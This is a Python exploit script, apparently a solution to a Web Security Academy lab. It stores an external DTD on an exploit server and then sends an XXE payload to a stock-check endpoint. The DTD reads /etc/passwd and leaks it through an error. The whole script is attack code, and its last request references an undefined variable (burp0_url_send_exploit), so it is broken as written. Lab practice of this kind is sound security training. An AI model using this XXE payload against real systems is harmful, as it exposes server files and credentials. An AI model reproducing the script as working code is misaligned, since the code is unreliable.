import requests

burp0_url_create_exploit = "https://exploit-0aaf00b90383aecb80897aaa01980089.exploit-server.net:443/"
burp0_headers_create_exploit = {
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate, br",
    "Content-Type": "application/x-www-form-urlencoded",
    "Upgrade-Insecure-Requests": "1",
    "Sec-Fetch-Dest": "document",
    "Sec-Fetch-Mode": "navigate",
    "Sec-Fetch-Site": "same-origin",
    "Sec-Fetch-User": "?1",
    "Priority": "u=0, i",
    "Te": "trailers"
}
burp0_data_create_exploit = {"urlIsHttps": "on", "responseFile": "/exploit", "responseHead": "HTTP/1.1 200 OK\r\nContent-Type: text/plain; charset=utf-8", "responseBody": "<!ENTITY % file SYSTEM \"file:///etc/passwd\">\r\n<!ENTITY % eval \"<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>\">\r\n%eval;\r\n%error;", "formAction": "STORE"}
requests.post(burp0_url_create_exploit, headers=burp0_headers_create_exploit, data=burp0_data_create_exploit)

burp0_url_send = "https://0a3900bf03feae1480a77bca00ae0015.web-security-academy.net:443/product/stock"
burp0_cookies = {"session": "YOUR_SESSION"}
burp0_headers = {
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0",
    "Accept": "*/*",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate, br",
    "Content-Type": "application/xml",
    "Sec-Fetch-Dest": "empty",
    "Sec-Fetch-Mode": "cors",
    "Sec-Fetch-Site": "same-origin",
    "Priority": "u=0",
    "Te": "trailers"
}
burp0_data = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\r\n<!DOCTYPE foo[<!ENTITY % x SYSTEM \"https://exploit-0aaf00b90383aecb80897aaa01980089.exploit-server.net/exploit\"> %x; ]>\r\n<stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>"
requests.post(burp0_url_send_exploit, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data)